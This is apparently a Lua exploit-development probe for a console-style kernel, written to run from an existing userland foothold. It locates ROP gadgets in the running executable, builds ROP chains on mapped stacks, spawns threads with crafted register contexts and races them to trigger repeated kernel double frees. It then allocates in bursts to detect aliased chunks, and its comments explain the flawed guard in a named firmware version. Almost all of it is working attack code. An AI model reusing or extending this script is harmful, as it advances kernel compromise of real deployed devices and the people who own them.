-- CRASH_CLASS: HIGH
-- PROBE 791f: accumulate double frees, then force reuse across magazines
--
-- Context: 791d/791e measured 39-42 double deletes in 48. The 13.60 code shows
-- the guard at 8ad6fec6 only skips the C free; S, D, P and T are freed by both
-- callers unconditionally, so each raced id double-frees four objects.
--
-- A single clean burst after one race proves nothing about the allocator: the
-- two children free on their own CPUs, so the duplicate chunks sit in two
-- per-CPU magazines, and a burst on the Lua thread draws from a third. Kernel
-- magazines have a bounded depth and flush overflow to the shared zone list,
-- so repeating the race many times pushes duplicates into the common pool.
--
-- This probe runs R rounds of the barrier race, then two bursts of count=1
-- blocks from the Lua thread and walks every one. An aliased chunk shows up as
-- a create that cannot poll to 3, a delete that does not return 0, an id that
-- appears twice, or a death.

print("=== PROBE 791f: repeated doubles then cross-magazine reuse ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local READ, WRITE, SOCKETPAIR = 3, 4, 135
local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[0] gadgets missing") return end
print(string.format("[0] eboot=%X gadgets ok", ebase))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}

local STACK = page*4
local function spawn_parked(fd, idpage, count, statpage)
    local block = mmap(STACK)
    local base = block + STACK - 0x200
    local p = base
    wq(p, uint64(pop_rdi)); wq(p+8,  uint64(idpage))
    wq(p+16, uint64(pop_rsi)); wq(p+24, uint64(count))
    wq(p+32, uint64(pop_rdx)); wq(p+40, uint64(statpage))
    wq(p+48, uint64(pop_rax)); wq(p+56, uint64(662))
    wq(p+64, uint64(fn))
    wq(p+72, uint64(pop_rax)); wq(p+80, uint64(431))
    wq(p+88, uint64(fn));      wq(p+96, uint64(jmp_g))
    local buf = mmap(page)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(fd));      wq(ctx+Ctx.RSI, uint64(buf))
    wq(ctx+Ctx.RDX, uint64(1));       wq(ctx+Ctx.RAX, uint64(READ))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local fds = memory.alloc(8)
local function pairsock()
    wd(fds, 0xFFFFFFFF); wd(fds+4, 0xFFFFFFFF)
    local ok, rv = pcall(function() return mk(SOCKETPAIR)(uint64(1), uint64(1), uint64(0), uint64(fds)) end)
    if not (ok and to_num(rv) == 0) then return nil, nil end
    return rd(fds), rd(fds+4)
end
local one = mmap(page)
wb(one, 0x41)
local data = mmap(page)
wd(data+0x20, 0x2A)

local M = 48
local total_dbl, rounds_ok = 0, 0
local R = 10
for rnd=1,R do
    local ids = mmap(page)
    local made = 0
    for k=1,M do
        local o = mmap(page)
        local okc, rvc = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(1), uint64(1), uint64(o)) end)
        if okc and to_num(rvc) == 0 then
            made = made + 1
            wd(ids + (made-1)*4, rd(o) or 0)
        end
    end
    if made ~= M then
        print(string.format("[A] round %d only %d/%d creates, stopping", rnd, made, M))
        break
    end
    local pp = mmap(page)
    local okp, rvp = pcall(function() return mk(664)(uint64(ids), uint64(M), uint64(pp)) end)
    local n3 = 0
    for k=0,M-1 do if (rd(pp + k*4) or 0) == 3 then n3 = n3 + 1 end end
    if n3 ~= M or to_num(rvp) ~= 0 then
        print(string.format("[A] round %d poll %d/%d rv=%s, stopping", rnd, n3, M, tostring(to_num(rvp))))
        break
    end
    local r1, w1 = pairsock()
    local r2, w2 = pairsock()
    if not (r1 and r2) then print("[A] socketpair failed"); break end
    local sA, sB = mmap(page), mmap(page)
    for i=0,M-1 do wd(sA + i*4, 0xAAAAAAAA); wd(sB + i*4, 0xBBBBBBBB) end
    local okA = spawn_parked(r1, ids, M, sA)
    local okB = spawn_parked(r2, ids, M, sB)
    sleep_ms(30)
    pcall(function() return mk(WRITE)(uint64(w1), uint64(one), uint64(1), uint64(0), uint64(0)) end)
    pcall(function() return mk(WRITE)(uint64(w2), uint64(one), uint64(1), uint64(0), uint64(0)) end)
    sleep_ms(120)
    local dbl = 0
    for k=0,M-1 do
        if (rd(sA + k*4) or 1) == 0 and (rd(sB + k*4) or 1) == 0 then dbl = dbl + 1 end
    end
    total_dbl = total_dbl + dbl
    rounds_ok = rounds_ok + 1
    print(string.format("[A] round %d doubles=%d/%d children=%s/%s", rnd, dbl, M, tostring(okA), tostring(okB)))
end
print(string.format("[B] rounds=%d total doubles=%d", rounds_ok, total_dbl))

-- Burst from the Lua thread; duplicates flushed to the shared zone should
-- surface here.
local B = 48
local seen = {}
local dup = 0
local bad = 0
for b=1,2 do
    local burst = {}
    local n = 0
    for k=1,B do
        local o = mmap(page)
        local okc, rvc = pcall(function() return mk(669)(uint64(0x1001), uint64(data), uint64(1), uint64(1), uint64(o)) end)
        if not (okc and to_num(rvc) == 0) then
            print(string.format("[C] burst %d create %d failed ok=%s rv=%s", b, k, tostring(okc), tostring(to_num(rvc))))
            break
        end
        local id = rd(o) or 0
        n = n + 1
        burst[n] = id
        if seen[id] then dup = dup + 1; print(string.format("[C] duplicate id %08X", id)) end
        seen[id] = true
    end
    local p3 = 0
    for k=1,n do
        local o, qp, st = mmap(page), mmap(page), mmap(page)
        wd(o, burst[k])
        pcall(function() return mk(664)(uint64(o), uint64(1), uint64(qp)) end)
        local ok3, rv3 = pcall(function() return mk(662)(uint64(o), uint64(1), uint64(st)) end)
        local ps, ds = rd(qp) or 0, rd(st) or 0
        if ps == 3 then p3 = p3 + 1 end
        if not (ps == 3 and ds == 0 and to_num(rv3) == 0) then
            bad = bad + 1
            print(string.format("[D] burst %d item %d id=%08X poll=%08X del=%s/%08X", b, k, burst[k], ps, tostring(to_num(rv3)), ds))
        end
    end
    print(string.format("[D] burst %d: created=%d poll3=%d anomalies=%d", b, n, p3, bad))
end
print(string.format("[E] duplicate ids=%d anomalies=%d", dup, bad))

local hb = 0
for k=1,8 do
    local o, qp, st = mmap(page), mmap(page), mmap(page)
    local ok1, rv1 = pcall(function() return mk(669)(uint64(1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    pcall(function() return mk(664)(uint64(o), uint64(1), uint64(qp)) end)
    local ok3, rv3 = pcall(function() return mk(662)(uint64(o), uint64(1), uint64(st)) end)
    if not (ok1 and to_num(rv1) == 0 and ok3 and to_num(rv3) == 0 and (rd(st) or -1) == 0) then hb = hb + 1 end
end
print(string.format("[F] health anomalies=%d/8", hb))
print("=== PROBE 791f DONE ===")
